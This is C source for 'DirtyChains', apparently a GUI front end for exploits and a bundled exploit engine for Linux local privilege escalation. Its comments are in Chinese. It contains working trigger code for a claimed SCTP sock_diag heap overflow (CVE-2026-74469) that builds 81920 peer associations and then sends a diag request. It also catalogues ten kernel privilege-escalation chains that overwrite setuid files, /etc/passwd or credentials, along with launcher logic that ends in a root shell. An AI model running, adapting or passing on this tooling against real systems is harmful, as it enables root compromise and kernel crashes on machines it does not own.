    int diag_fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, DS_NETLINK_SOCK_DIAG);
    int have_sctp = sctp_fd >= 0;
    int have_diag = diag_fd >= 0;
    char ver[256] = {0};
    FILE *v = fopen("/proc/version", "r");

    if (v) {
        size_t n = fread(ver, 1, sizeof(ver) - 1, v);
        if (n > 0)
            ver[n] = '\0';
        fclose(v);
    }
    printf("[*] CVE-2026-74469 (DiagSpill) 前提检测\n");
    printf("  AF_SCTP 套接字      : %s\n", have_sctp ? "可用" : "不可用");
    printf("  NETLINK_SOCK_DIAG    : %s\n", have_diag ? "可用" : "不可用");
    printf("  内核版本            : %s", ver);
    printf("  修复版本            : 5.10.270 / 5.15.221 / 6.1.188 / 6.6.157 /\n"
           "                       6.12.109 / 6.18.50 / 7.2.4 起\n");
    if (diag_fd >= 0)
        close(diag_fd);
    if (sctp_fd >= 0)
        close(sctp_fd);
    if (!have_sctp || !have_diag) {
        printf("[-] SCTP 或 sock_diag 不可用, 此内核大概率打不上(退出码 3)\n");
        return 3;
    }
    printf("[+] 前提齐备: SCTP + sock_diag 可用。是否真未修复以 -test 实测为准。\n");
    printf("    (完整 LPE 仅 6.17/6.19 + 4 vCPU/4GB 成立, 此处不含)\n");
    return 0;
}

static int diagspill_main(int argc, char **argv)
{
    int mode = -1, force = 0;

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-check"))
            mode = 0;
        else if (!strcmp(argv[i], "-test") || !strcmp(argv[i], "-start"))
            mode = 1;
        else if (!strcmp(argv[i], "-find"))
            mode = 2;
        else if (!strcmp(argv[i], "-force"))
            force = 1;
        else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
            ds_usage();
            return 0;
        } else {
            fprintf(stderr, "未知参数: %s\n", argv[i]);
            ds_usage();
            return 2;
        }
    }
    if (mode < 0) {
        ds_usage();
        return 2;
    }
    if (mode == 0)
        return ds_check();
    if (mode == 2) {
        printf("[*] DiagSpill 不需要 setuid 靶子(堆越界写, 不碰文件), 跳过扫描。\n");
        return 0;
    }

    /* mode == 1: 破坏性触发 */
    if (!force) {
        fprintf(stderr, "这是破坏性操作: 会写出约 10MB 堆越界, 大概率 panic、需重启。\n");
        fprintf(stderr, "加 -force 确认(仅 disposable VM 上跑)。\n");
        return 2;
    }

    {
        struct sockaddr_in6 *peers = ds_make_peers(45678U, DS_OVERFLOW_PEERS);
        struct sockaddr_in6 local;
        socklen_t ll = sizeof(local);
        int sctp_fd, nl;

        if (!peers) {
            fprintf(stderr, "calloc 失败\n");
            return 1;
        }
        sctp_fd = socket(AF_INET6, SOCK_STREAM | SOCK_NONBLOCK | SOCK_CLOEXEC,
                         IPPROTO_SCTP);
        if (sctp_fd < 0) {
            fprintf(stderr, "SCTP 套接字失败: %s\n", strerror(errno));
            free(peers);
            return 3;
        }
        printf("[*] 建 81920 对端关联, 触发 transport_count 回绕...\n");
        if (ds_connectx_many(sctp_fd, peers, DS_OVERFLOW_PEERS) < 0) {
            fprintf(stderr, "[-] 关联建立失败(内核可能已修复或拒绝)\n");
            close(sctp_fd);
            free(peers);
            return 1;
        }
        if (getsockname(sctp_fd, (struct sockaddr *)&local, &ll) < 0) {
            close(sctp_fd);
            free(peers);
            return 1;
        }
        printf("[*] 发 sctp_diag INET_DIAG_PEERS 请求, 触发堆越界写...\n");
        if (ds_prepare_diag(sctp_fd, &peers[0], &nl) < 0) {
            fprintf(stderr, "[-] diag 请求发送失败: %s\n", strerror(errno));
            close(sctp_fd);
            free(peers);
            return 1;
        }
        printf("[+] diag 请求已发出。若内核未修复, 此刻应已发生约 10MB 堆越界写。\n");
        printf("    (完整 LPE 见 README; 此处仅证明漏洞存在 / DoS 演示)\n");
        fflush(NULL);
        sleep(2);
        close(sctp_fd);
        free(peers);
        return 0;
    }
}

#define APP_TITLE       "DirtyChains · 本地提权"
/* 构建标识: 标题栏副标题上直接显示, 用来确认跑的是不是最新这份 */
#define DF_BUILD        "2026-11-06-r38"
#define APP_SUBTITLE    "十链 PoC 图形前端 · " DF_BUILD
#define LOG_MAX_LINES   20000
#define PTY_COLS        110
#define PTY_ROWS        32
#define PATH_BUF        1024

/* ---------------------------------------------------------------------------
 * 链条描述表。顺序即下拉框顺序 (下标 0 是"全部")。
 * ------------------------------------------------------------------------ */
typedef struct {
    const char *id;      /* 传给 poc 的编号参数 */
    const char *tag;     /* 下拉框里显示的短名 */
    const char *name;    /* 全名 */
    const char *desc;    /* 说明 */
    const char *need;    /* 前提 */
    int         engine;  /* 0 = 内置 dirtychains 引擎, 1 = ovswrap 引擎 */
    unsigned char p_t,     /* 支持一键提权 -t 指定目标 */
                  p_write, /* 支持 -to/-set 通用写 */
                  p_off;   /* 支持 -offset 起始偏移 */
} Chain;

static const Chain chains[] = {
    { "-2026-31431", "31431 · Copy Fail",
      "CVE-2026-31431  AF_ALG / AEAD",
      "splice 文件页进 AEAD, 原地解密写 4 字节",
      "需 authencesn(hmac(sha256),cbc(aes)) + algif_aead", 0,
      1, 1, 1 },

    { "-2026-43284", "43284 · XFRM/ESP",
      "CVE-2026-43284  XFRM / ESP",
      "splice + esp_input 原地解密, 写 ESN 高 32 位",
      "需非特权 userns + XFRM + ESP", 0,
      0, 1, 1 },

    { "-2026-43500", "43500 · RxRPC",
      "CVE-2026-43500  RxRPC / RXKAD",
      "8 字节 pcbc(fcrypt) 原地解密, 改 /etc/passwd 首行",
      "需 AF_RXRPC + RXKAD, 写位置固定", 0,
      1, 0, 0 },

    { "-2026-43494", "43494 · io_uring",
      "CVE-2026-43494  io_uring + RDS",
      "页引用计数劫持, 整页替换 setuid 文件",
      "需 IORING_REGISTER_CLONE_BUFFERS (6.12+)", 0,
      1, 1, 1 },

    { "-2026-46331", "46331 · act_pedit",
      "CVE-2026-46331  net/sched act_pedit",
      "sendfile 进 loopback, pedit 改 TCP 头, 写穿页缓存",
      "需 act_pedit + clsact + userns", 0,
      1, 1, 1 },

    { "-2026-64531", "64531 · OVS CT",
      "CVE-2026-64531  net/openvswitch CT action",
      "伪造 SET action 越界读内核内存, dst_release 递减改 cred",
      "需 openvswitch + userns，偏移读 offset/ 配置表", 1,
      0, 0, 0 },

    { "-2026-46300", "46300 · Fragnesia",
      "CVE-2026-46300  XFRM / espintcp",
      "ESP 分片经 TCP coalesce 被当普通数据写回页缓存, 改只读文件",
      "需非特权 userns + XFRM espintcp"
      "（Ubuntu 先关 apparmor_restrict_unprivileged_userns）", 2,
      1, 0, 1 },

    { "-2026-43503", "43503 · DirtyClone",
      "CVE-2026-43503  XFRM / ESP over UDP",
      "ESP 的 esn.seq_hi 被当明文写回页缓存, 一个 SA 带 4 字节",
      "需非特权 userns + XFRM espinudp(4500)；192 字节载荷 = 48 个 SA", 3,
      1, 0, 1 },

    { "-2026-31635", "31635 · DirtyDecrypt",
      "CVE-2026-31635  RxRPC / RXGK",
      "rxgk 解密原地写回页缓存, 逐字节猜 key, 换掉目标整段 ELF 头",
      "需非特权 userns + AF_RXRPC + rxgk(security index 6)；120 字节载荷", 4,
      1, 0, 0 },

    { "-2026-74469", "74469 · DiagSpill",
      "CVE-2026-74469  SCTP / sctp_diag",
      "transport_count 16 位回绕, sctp_diag 约 10MB 堆越界写",
      "仅需 SCTP + sctp_diag, 不要 userns / 模块 / setuid 靶子；完整 LPE 锁 6.17/6.19", 5,
      0, 0, 0 },
};
#define N_CHAINS ((int)(sizeof(chains) / sizeof(chains[0])))

/*
 * 侧栏类别表。单链类 (members == NULL) 点击直接切链;
 * 多链类点击后弹窗, 让用户在同一类里挑具体漏洞。
 */
static const int cat_write_members[] = { 0, 1, 6, 7, 8 };
/* 31431 / 43284 / 46300 / 43503 / 31635 */
static const int cat_oob_members[]   = { 2, 4, 5, 9 }; /* 43500 / 46331 / 64531 / 74469 */

static const struct {
    const char *name;        /* 侧栏条目 */
    int         first;       /* 单链类: chains 下标 */
    const int  *members;     /* 多链类: chains 下标数组 */
    int         n;
} side_cats[] = {
    { "原地写类",      -1, cat_write_members,
      (int)(sizeof(cat_write_members) / sizeof(cat_write_members[0])) },
    { "UAF类",          3, NULL,             0 },
    { "OOB/越界写类",  -1, cat_oob_members,
      (int)(sizeof(cat_oob_members) / sizeof(cat_oob_members[0])) },
};
#define N_CATS ((int)(sizeof(side_cats) / sizeof(side_cats[0])))

/* ---------------------------------------------------------------------------
 * 应用状态
 * ------------------------------------------------------------------------ */
typedef struct {
    GtkWidget *window;
    GtkWidget *header;
    GtkWidget *btn_expand;   /* 左上角「展开」开关 */
    GtkWidget *img_expand;
    GtkWidget *lbl_expand;
    GtkWidget *revealer;     /* 展开后的左侧任务抽屉 */
    GtkWidget *task_list;    /* 抽屉里的任务列表 (GtkListBox) */
    gboolean    side_sync;   /* 列表 <-> 下拉框同步中, 防止互相触发 */
    GtkWidget *cve_revealer; /* 多链类别的「漏洞选择」框 (配置区上方) */
    GtkWidget *cve_combo;
    gulong      cve_combo_sig;
    GtkWidget *cve_hint_lbl; /* 右上角: 当前选择的 CVE / 暂未选择CVE */
    GtkWidget *banner, *banner_lbl;
    GtkWidget *combo;
    GtkWidget *lbl_name, *lbl_desc, *lbl_need;
    GtkWidget *entry_target, *entry_to, *entry_set, *entry_offset;
    GtkWidget *entry_krec;   /* OVS 链: 指定内核版本匹配 offset/ 表 */
    GtkWidget *btn_vmlinux;  /* OVS 链: 解析 vmlinux (pahole/BTF 推导偏移) */
    GtkWidget *btn_pick_offset; /* OVS 链: 浏览 offset/ 里已有的 target.h */
    GtkWidget *btn_root_off;    /* OVS 链: root 加载 krec_dump.ko 取偏移 */
    GtkWidget *lbl_root_off;    /* 上面那个按钮所在行的标签 */
    GtkWidget *root_off_row;    /* 整行容器, 便于按链显隐 */
    /* 参数面板各行的标签/按钮, 便于按所选 CVE 显隐 */
    GtkWidget *lbl_t, *browse_t;
    GtkWidget *lbl_to, *browse_to;
    GtkWidget *lbl_set, *browse_set;
    GtkWidget *lbl_off, *off_row;
    GtkWidget *lbl_krec;
    GtkWidget *chk_nobackup, *chk_verbose;
    GtkWidget *btn_check, *btn_test, *btn_lpe, *btn_write, *btn_find, *btn_stop;
    GtkWidget   *logview;
    GtkTextBuffer *logbuf;
    GtkTextMark *log_end_mark;
    GtkWidget *entry_input, *btn_send, *btn_ctrlc;
    GtkWidget *status_lbl, *spinner;

    GtkTextTag *tag_fg[8];   /* 30..37 */
    GtkTextTag *tag_bold, *tag_dim;

    /* 子进程 */
    int         master_fd;
    GPid        pid;
    guint       watch_id;
    guint       child_id;
    gboolean    running;

    /* ANSI 解析状态 */
    int         ansi_state;  /* 0 普通 / 1 ESC / 2 CSI / 3 OSC */
    GString    *csi;
    GString    *run;         /* 待插入的同色文本 */
    int         cur_fg;      /* -1 = 默认 */
    int         cur_bold, cur_dim;
    int         trim_counter;

    char       *poc_path;
    gboolean    poc_builtin; /* TRUE: 用自身内置引擎 (子进程加 --engine) */
    int         last_exit;
    gboolean    stop_requested;
    const char *action;      /* 当前动作, 用于退出码文案 */

    /* 背景图 */
    GtkWidget  *bg_area;
    GdkPixbuf  *bg_pix;
    cairo_surface_t *bg_surf;   /* 已按窗口尺寸 cover 缩放 + 白雾, 一次画好 */
    int         bg_cache_w, bg_cache_h;
    char       *bg_path;
} App;

/* ---------------------------------------------------------------------------
 * 小工具
 * ------------------------------------------------------------------------ */
static const char *user_name(void)
{
    static char buf[64];
    uid_t u = getuid();
    struct passwd *pw;

    if (buf[0])
        return buf;
    pw = getpwuid(u);
    if (pw)
        g_strlcpy(buf, pw->pw_name, sizeof(buf));
    else
        g_snprintf(buf, sizeof(buf), "uid=%u", (unsigned)u);
    return buf;
}

static const char *kernel_release(void)
{
    static char buf[128];

    struct utsname ut;

    if (buf[0])
        return buf;
    if (uname(&ut) == 0)
        g_strlcpy(buf, ut.release, sizeof(buf));
    else
        g_strlcpy(buf, "未知", sizeof(buf));
    return buf;
}

/*
 * 引擎入口: 由 Makefile 用 -Dmain=dirtychains_poc_main 把 poc 的 main 改名后
 * 链接进来, 于是本程序既是 GUI 也是 poc。
 */
extern int dirtychains_poc_main(int argc, char **argv);
int ovswrap_main(int argc, char **argv);

/*
 * 决定跑哪个引擎:
 *   --poc <路径> / DIRTYCHAINS_POC -> 外部 poc 可执行文件 (旧名 DIRTYFRAG_POC 仍认)
 *   其余情况                      -> 自身 (加 --engine 参数, 子进程 exec 自己)
 *
 * 用 "exec 自身" 而不是在 fork 出来的子进程里直接调函数: 子进程经过 exec
 * 得到干净地址空间 (不带着 GTK / glib 的线程与锁状态), 而提权成功后引擎会
 * execl("/bin/sh"), 本来也需要一个可被整体替换的进程。
 */
static char *self_exe(void)
{
    char exe[PATH_MAX];
    ssize_t n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);

    if (n <= 0)
        return NULL;
    exe[n] = '\0';
    return g_strdup(exe);
}

static char *find_poc(const char *override, gboolean *builtin)
{
    const char *env = g_getenv("DIRTYCHAINS_POC");

    if (!env || !*env)                 /* 旧名，兼容 1.6 及更早的脚本 */
        env = g_getenv("DIRTYFRAG_POC");

    *builtin = FALSE;
    if (override && *override)
        return g_strdup(override);
    if (env && *env)
        return g_strdup(env);

    *builtin = TRUE;
    return self_exe();
}

/* ---------------------------------------------------------------------------
 * 背景图
 *
 * 查找顺序: --bg 参数 > DIRTYCHAINS_BG > 程序同目录 assets/bg.png > 同目录
 * bg.png > ../share/dirtychains/bg.png > 当前目录 > /usr[/local]/share。
 * 找不到就用淡蓝纯色底, 界面照常可用。
 * ------------------------------------------------------------------------ */
static char *find_bg(const char *override)
{
    static const char *sys[] = {
        "/usr/local/share/dirtychains/bg.png",
        "/usr/share/dirtychains/bg.png",
        "/usr/local/share/dirtyfrag/bg.png",
        "/usr/share/dirtyfrag/bg.png",
    };
    static const char *rel[] = { "assets/bg.png", "bg.png" };
    char exe[PATH_MAX];
    ssize_t n;
    size_t i;
    const char *env = g_getenv("DIRTYCHAINS_BG");

    if (!env || !*env)                 /* 旧名，兼容 */
        env = g_getenv("DIRTYFRAG_BG");

    if (override && *override)
        return g_strdup(override);
    if (env && *env)
        return g_strdup(env);

    n = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
    if (n > 0) {
        char *dir;

        exe[n] = '\0';
        dir = g_path_get_dirname(exe);
        for (i = 0; i < G_N_ELEMENTS(rel); i++) {
            char *c = g_build_filename(dir, rel[i], NULL);

            if (g_file_test(c, G_FILE_TEST_EXISTS)) {
                g_free(dir);
                return c;
            }
            g_free(c);
        }
        {
            char *c = g_build_filename(dir, "..", "share", "dirtychains",
                                       "bg.png", NULL);

            if (g_file_test(c, G_FILE_TEST_EXISTS)) {
                g_free(dir);
                return c;
            }
            g_free(c);
        }
        g_free(dir);
    }

    for (i = 0; i < G_N_ELEMENTS(rel); i++)
        if (g_file_test(rel[i], G_FILE_TEST_EXISTS))
            return g_strdup(rel[i]);
    for (i = 0; i < G_N_ELEMENTS(sys); i++)
        if (g_file_test(sys[i], G_FILE_TEST_EXISTS))
            return g_strdup(sys[i]);

    return NULL;
}

/*
 * 把 "cover 缩放 + 白雾" 一次性合成到一张与窗口等大的 image surface 上。
 * 这样每次 expose 只剩一次 blit, 移动/缩放窗口时不会因为实时缩放整张
 * 大图而掉帧拉出残影。
 */
static void bg_cache_rebuild(App *a, int w, int h)
{
    cairo_surface_t *surf;
    cairo_t *cr;
    int iw, ih;
    double s, dw, dh;

    if (!a->bg_pix || w < 1 || h < 1)
        return;
    if (a->bg_surf && a->bg_cache_w == w && a->bg_cache_h == h)
        return;

    if (a->bg_surf) {
        cairo_surface_destroy(a->bg_surf);
        a->bg_surf = NULL;
    }

    surf = cairo_image_surface_create(CAIRO_FORMAT_RGB24, w, h);
    if (cairo_surface_status(surf) != CAIRO_STATUS_SUCCESS) {
        cairo_surface_destroy(surf);
        return;
    }
    cr = cairo_create(surf);

    cairo_set_source_rgb(cr, 0.937, 0.957, 0.980);
    cairo_paint(cr);

    iw = gdk_pixbuf_get_width(a->bg_pix);
    ih = gdk_pixbuf_get_height(a->bg_pix);
    s = MAX((double)w / (double)iw, (double)h / (double)ih);
    dw = iw * s;
    dh = ih * s;

    cairo_save(cr);
    cairo_rectangle(cr, 0, 0, w, h);
    cairo_clip(cr);
    cairo_translate(cr, (w - dw) / 2.0, (h - dh) / 2.0);
    cairo_scale(cr, s, s);
    gdk_cairo_set_source_pixbuf(cr, a->bg_pix, 0, 0);
    cairo_pattern_set_filter(cairo_get_source(cr), CAIRO_FILTER_BILINEAR);
    cairo_paint(cr);
    cairo_restore(cr);

    /* 一层白雾: 压低图片对比度, 让压在图上的深色文字依然清楚 */
    cairo_set_source_rgba(cr, 0.98, 0.99, 1.0, 0.26);
    cairo_paint(cr);

    cairo_destroy(cr);
    a->bg_surf = surf;
    a->bg_cache_w = w;
    a->bg_cache_h = h;
}

/*
 * 窗口被拖动或改尺寸时整块重绘背景。无合成器的 X11 只重绘被标记为
 * 损坏的区域, 窗口移动过程中容易漏掉边缘, 剩下一块未定义的像素
 * (看起来就是画面被撕裂、透出桌面)。
 */
static gboolean on_configure(GtkWidget *w, GdkEventConfigure *ev, gpointer data)
{
    App *a = data;

    (void)w;
    (void)ev;
    if (a->bg_area)
        gtk_widget_queue_draw(a->bg_area);
    return FALSE;
}

/*
 * 背景层是 GtkOverlay 的底层 child (GtkDrawingArea), 界面控件压在它上面。
 * 控件都是不透明浅色, 因此不依赖合成器/窗口 alpha, 在 Xvfb、无合成器的
 * XFCE 会话里表现一致。
 */
static gboolean on_bg_draw(GtkWidget *w, cairo_t *cr, gpointer data)
{
    App *a = data;
    int ww = gtk_widget_get_allocated_width(w);
    int wh = gtk_widget_get_allocated_height(w);

    /* 兜底底色: 任何情况下窗口都不会露出后面的桌面 */
    cairo_set_source_rgb(cr, 0.937, 0.957, 0.980);
    cairo_paint(cr);
    if (!a->bg_pix)
        return FALSE;

    bg_cache_rebuild(a, ww, wh);
    if (a->bg_surf) {
        cairo_set_source_surface(cr, a->bg_surf, 0, 0);
        cairo_set_operator(cr, CAIRO_OPERATOR_SOURCE);
        cairo_paint(cr);
        cairo_set_operator(cr, CAIRO_OPERATOR_OVER);
    }
    return FALSE;
}

/* ---------------------------------------------------------------------------
 * 日志区
 * ------------------------------------------------------------------------ */

/*
 * 兜底填色: 在控件自己的绘制之前, 先把整块画成不透明底色。
 *
 * GtkTextView / GtkScrolledWindow 各带一个 GdkWindow。没有合成器时, 若
 * 样式里没有不透明背景, GTK 的默认 draw handler 不会清屏, 这块窗口就
 * 保留 X 服务器的未定义内容 —— 表现为日志区一片黑 (root window) 或透出
 * 桌面壁纸, 而且拖动窗口时不会自己刷新。
 *
 * draw 信号是 RUN_LAST, 普通 connect 排在默认 handler 之前, 所以这里填的
 * 底色会留下, 随后默认 handler 只往上画文字/滚动条。这样即使系统主题或
 * CSS 选择器没命中 (深色主题、精简主题、旧 GTK), 也不会露出黑块。
 */
static gboolean on_panel_draw(GtkWidget *w, cairo_t *cr, gpointer data)
{
    GdkRGBA c;
    const char *hex = data;

    (void)w;
    if (hex && gdk_rgba_parse(&c, hex))
        gdk_cairo_set_source_rgba(cr, &c);
    else
        cairo_set_source_rgb(cr, 0.984, 0.992, 1.0);
    cairo_paint(cr);
    return FALSE;
}

static void log_scroll_bottom(App *a)
{
    GtkTextIter end;

    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    gtk_text_buffer_move_mark(a->logbuf, a->log_end_mark, &end);
    gtk_text_view_scroll_to_mark(GTK_TEXT_VIEW(a->logview),
                                 a->log_end_mark, 0.0, TRUE, 0.0, 1.0);
}

static void log_trim(App *a)
{
    GtkTextIter start, cut;
    int lines;

    if (++a->trim_counter < 40)
        return;
    a->trim_counter = 0;

    lines = gtk_text_buffer_get_line_count(a->logbuf);
    if (lines <= LOG_MAX_LINES)
        return;

    gtk_text_buffer_get_start_iter(a->logbuf, &start);
    cut = start;
    gtk_text_iter_forward_lines(&cut, lines - LOG_MAX_LINES);
    gtk_text_buffer_delete(a->logbuf, &start, &cut);
}

/* 把 run 缓冲区按当前颜色插入 */
static void log_flush(App *a)
{
    GtkTextIter end;
    GtkTextTag *tags[4];
    int nt = 0;

    if (!a->run || a->run->len == 0)
        return;

    if (a->cur_fg >= 0 && a->tag_fg[a->cur_fg])
        tags[nt++] = a->tag_fg[a->cur_fg];
    if (a->cur_bold)
        tags[nt++] = a->tag_bold;
    if (a->cur_dim)
        tags[nt++] = a->tag_dim;

    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    if (nt == 0) {
        gtk_text_buffer_insert(a->logbuf, &end, a->run->str, (gint)a->run->len);
    } else {
        tags[nt] = NULL;
        gtk_text_buffer_insert_with_tags(a->logbuf, &end, a->run->str,
                                         (gint)a->run->len,
                                         tags[0],
                                         nt > 1 ? tags[1] : NULL,
                                         nt > 2 ? tags[2] : NULL,
                                         NULL);
    }
    g_string_truncate(a->run, 0);
    log_trim(a);
}

/* 每个动作开始前清空日志：丢掉上一次的内容，并重置 ANSI 解析状态，
 * 避免上一条命令残留的半截转义序列影响新输出。 */
static void log_reset(App *a)
{
    if (!a->logbuf)
        return;
    if (a->run)
        g_string_truncate(a->run, 0);
    if (a->csi)
        g_string_truncate(a->csi, 0);
    a->ansi_state = 0;
    a->cur_fg = -1;
    a->cur_bold = 0;
    a->cur_dim = 0;
    gtk_text_buffer_set_text(a->logbuf, "", -1);
}

/*
 * 单独的回车 (后面不是 \n): 把当前这一行清掉, 让进度条原地刷新。
 * 不这样处理的话, 每次刷新都会接在同一行尾巴上, 折行后看起来像一堆
 * 重叠的乱码。
 */
static void log_carriage_return(App *a)
{
    GtkTextIter end, bol;

    log_flush(a);
    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    bol = end;
    gtk_text_iter_set_line_offset(&bol, 0);
    if (!gtk_text_iter_equal(&bol, &end))
        gtk_text_buffer_delete(a->logbuf, &bol, &end);
}

static void log_append_plain(App *a, const char *text)
{
    GtkTextIter end;

    log_flush(a);
    gtk_text_buffer_get_end_iter(a->logbuf, &end);
    gtk_text_buffer_insert(a->logbuf, &end, text, -1);
    log_scroll_bottom(a);
}

/* SGR 参数解析: 支持 0/1/2/22/30-37/39/90-97 */
static void sgr_apply(App *a, const char *params)
{
    gchar **parts;
    int i;

    if (!params || !*params) {
        a->cur_fg = -1;
        a->cur_bold = a->cur_dim = 0;
        return;
    }

    parts = g_strsplit(params, ";", -1);
    for (i = 0; parts[i]; i++) {
        int v;

        if (!*parts[i]) {
            /* 空参数等价于 0, 但 "0;" 这类尾部空项忽略即可 */
            continue;
        }
        v = atoi(parts[i]);
        if (v == 0) {
            a->cur_fg = -1;
            a->cur_bold = a->cur_dim = 0;
        } else if (v == 1) {
            a->cur_bold = 1;
        } else if (v == 2) {
            a->cur_dim = 1;
        } else if (v == 22) {
            a->cur_bold = a->cur_dim = 0;
        } else if (v >= 30 && v <= 37) {
            a->cur_fg = v - 30;
        } else if (v == 39) {
            a->cur_fg = -1;
        } else if (v >= 90 && v <= 97) {
            a->cur_fg = v - 90;
        }
    }
    g_strfreev(parts);
}

/* 逐字节解析 pty 输出 */
static void ansi_feed(App *a, const char *buf, gsize n)
{
    gsize i;

    for (i = 0; i < n; i++) {
        unsigned char c = (unsigned char)buf[i];

        switch (a->ansi_state) {
        case 0:
            if (c == 0x1b) {
                log_flush(a);
                a->ansi_state = 1;
            } else if (c == '\r') {
                /* \r\n 是 pty 的常规换行, 交给后面的 \n; 单独 \r 是进度刷新 */
                if (i + 1 < n && buf[i + 1] == '\n') {
                    /* 忽略 */
                } else if (i + 1 < n) {
                    log_carriage_return(a);
                }
            } else if (c == '\b') {
                if (a->run->len > 0)
                    g_string_truncate(a->run, a->run->len - 1);
            } else if (c == '\a') {
                /* 响铃忽略 */
            } else {
                g_string_append_c(a->run, (char)c);
                if (a->run->len >= 4096)
                    log_flush(a);
            }
            break;

        case 1:
            if (c == '[') {
                a->ansi_state = 2;
                g_string_truncate(a->csi, 0);
            } else if (c == ']') {
                a->ansi_state = 3;
            } else if (c == '(' || c == ')') {
                a->ansi_state = 4;   /* 字符集切换, 吃掉一个字节 */
            } else {
                a->ansi_state = 0;
            }
            break;

        case 2:
            if (c >= 0x40 && c <= 0x7e) {
                if (c == 'm')
                    sgr_apply(a, a->csi->str);
                a->ansi_state = 0;
            } else if (a->csi->len < 64) {
                g_string_append_c(a->csi, (char)c);
            } else {
                a->ansi_state = 0;
            }
            break;

        case 3:
            if (c == 0x07 || c == 0x1b)
                a->ansi_state = 0;
            break;

        case 4:
            a->ansi_state = 0;
            break;

        default:
            a->ansi_state = 0;
            break;
        }
    }
}

/* ---------------------------------------------------------------------------
 * 子进程: forkpty + execvp
 * ------------------------------------------------------------------------ */
static void app_set_busy(App *a, gboolean busy);

static gboolean on_pty_readable(GIOChannel *src, GIOCondition cond, gpointer data)
{
    App *a = data;
    char buf[8192];
    ssize_t n;

    (void)src;

    for (;;) {
        n = read(a->master_fd, buf, sizeof(buf));
        if (n > 0) {
            ansi_feed(a, buf, (gsize)n);
            continue;
        }
        if (n < 0 && (errno == EINTR))
            continue;
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK))
            break;

        /* n == 0 或真错误: 对端关闭 */
        log_flush(a);
        return FALSE;
    }

    log_flush(a);
    log_scroll_bottom(a);
    if (cond & (G_IO_HUP | G_IO_ERR))
        return FALSE;
    return TRUE;
}

static const Chain *cur_chain(App *a);

static void on_child_exit(GPid pid, gint status, gpointer data)
{
    App *a = data;
    const char *verdict;
    const char *color = "status-ok";
    int code = -1;

    g_spawn_close_pid(pid);

    if (WIFEXITED(status))
        code = WEXITSTATUS(status);
    else if (WIFSIGNALED(status))
        code = 128 + WTERMSIG(status);

    a->last_exit = code;
    a->pid = 0;
    a->child_id = 0;
    a->running = FALSE;

    /* 扫描 setuid 是纯只读探测，退出码含义和别的动作不通用：
       0 = 找到可用靶子, 1 = 一个都没有, 其它 = 环境错。
       这里必须先于各引擎的映射处理，否则 0 会被读成「有漏洞」、
       1（46300）会被读成「打穿了」，看着就像扫描在提权。 */
    if (a->action && strstr(a->action, "扫描")) {
        char sline[200];

        if (code == 0) {
            verdict = "扫描完成：有可用靶子 (退出码 0)";
            color = "status-ok";
        } else if (code == 1) {
            verdict = "扫描完成：没有可用靶子 (退出码 1)";
            color = "status-warn";
        } else {
            verdict = (code > 128) ? "扫描被信号终止" : "扫描异常退出";
            color = "status-err";
        }
        g_snprintf(sline, sizeof(sline), "\n── 进程结束: %s ──\n", verdict);
        log_flush(a);
        log_append_plain(a, sline);
        gtk_widget_set_name(a->status_lbl, color);
        gtk_label_set_text(GTK_LABEL(a->status_lbl), verdict);
        app_set_busy(a, FALSE);
        return;
    }

    /* CVE-2026-46300 的退出码和别的链反着来: 1 = 有漏洞, 0 = 没打成 */
    {
        const Chain *cc = cur_chain(a);

        if (cc && cc->engine == 2) {
            char line[200];

            switch (code) {
            case 1:
                verdict = "有漏洞：目标字节被改写 (退出码 1)";
                color = "status-ok";
                break;
            case 0:
                if (a->action && strstr(a->action, "检查")) {
                    verdict = "前置条件齐备 (退出码 0)";
                    color = "status-ok";
                } else {
                    verdict = "未观察到改写 (退出码 0)";
                    color = "status-warn";
                }
                break;
            case 2:
                verdict = "参数或目标文件不合法 (退出码 2)";
                color = "status-warn";
                break;
            case 4:
                verdict = "被前置条件挡住 (退出码 4)";
                color = "status-warn";
                break;
            default:
                verdict = (code > 128) ? "被信号终止" : "异常退出";
                color = "status-err";
                break;
            }

            g_snprintf(line, sizeof(line), "\n── 进程结束: %s ──\n", verdict);
            log_flush(a);
            log_append_plain(a, line);
            gtk_widget_set_name(a->status_lbl, color);
            gtk_label_set_text(GTK_LABEL(a->status_lbl), verdict);
            app_set_busy(a, FALSE);
            return;
        }

        /* CVE-2026-43503 / 31635 这两条和主引擎一致: 0 = 写成功, 1 = 没打成 */
        if (cc && (cc->engine == 3 || cc->engine == 4 || cc->engine == 5)) {
            char line[200];

            switch (code) {
            case 0:
                if (a->action && strstr(a->action, "检查")) {
                    verdict = "前置条件齐备 (退出码 0)";
                } else {
                    verdict = "有漏洞：触发成功 / 目标字节被改写 (退出码 0)";
                }
                color = "status-ok";
                break;
            case 1:
                verdict = "没打成：写原语或校验失败 (退出码 1)";
                color = "status-warn";
                break;
            case 2:
                verdict = "参数或目标文件不合法 (退出码 2)";
                color = "status-warn";
                break;
            case 3:
                verdict = "SCTP / sctp_diag 不可用 (退出码 3)";
                color = "status-warn";
                break;
            case 4:
                verdict = "被前置条件挡住 (退出码 4)";
                color = "status-warn";
                break;
            default:
                verdict = (code > 128) ? "被信号终止" : "异常退出";
                color = "status-err";
                break;
            }

            g_snprintf(line, sizeof(line), "\n── 进程结束: %s ──\n", verdict);
            log_flush(a);
            log_append_plain(a, line);
            gtk_widget_set_name(a->status_lbl, color);
            gtk_label_set_text(GTK_LABEL(a->status_lbl), verdict);
            app_set_busy(a, FALSE);
            return;
        }
    }

    /* -check 的 1 表示"没读到配置", 与"写了没生效"是两回事 */
    if (code == 1 && a->action && !strcmp(a->action, "检查配置")) {
        char line[160];

        g_snprintf(line, sizeof(line),
                   "\n── 进程结束: 配置检查未完成 (退出码 1) ──\n");
        log_flush(a);
        log_append_plain(a, line);
        gtk_widget_set_name(a->status_lbl, "status-warn");
        gtk_label_set_text(GTK_LABEL(a->status_lbl), "配置检查未完成 (退出码 1)");
        app_set_busy(a, FALSE);
        return;
    }

    if (a->stop_requested && code > 128) {
        char line[96];

        g_snprintf(line, sizeof(line), "\n── 进程结束: 已手动停止 ──\n");
        log_flush(a);
        log_append_plain(a, line);
        gtk_widget_set_name(a->status_lbl, "status-warn");
